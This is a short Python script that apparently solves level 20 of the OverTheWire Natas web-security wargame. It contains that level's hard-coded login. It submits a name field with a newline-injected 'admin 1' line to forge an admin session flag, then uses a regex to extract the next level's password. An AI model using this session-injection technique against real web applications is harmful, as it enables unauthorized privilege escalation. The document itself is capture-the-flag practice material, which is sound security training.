import requests
import re

username ='natas20'
password ='eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'

url = 'http://%s.natas.labs.overthewire.org/' %username
session = requests.Session()

responce = session.get (url +"?debug=true",auth =(username,password))
content = responce.text
print(content)
print("="*80)

responce = session.post(url +"?debug=true",data={"name":"name\nadmin 1"},auth =(username,password))
content = responce.text
print(content)
print("="*80)


responce = session.get (url +"?debug=true",auth =(username,password))
content = responce.text
print(content)
print("="*80)

print("passcode for natas 21 is = " + re.findall("Password: (.*)</",content)[0])
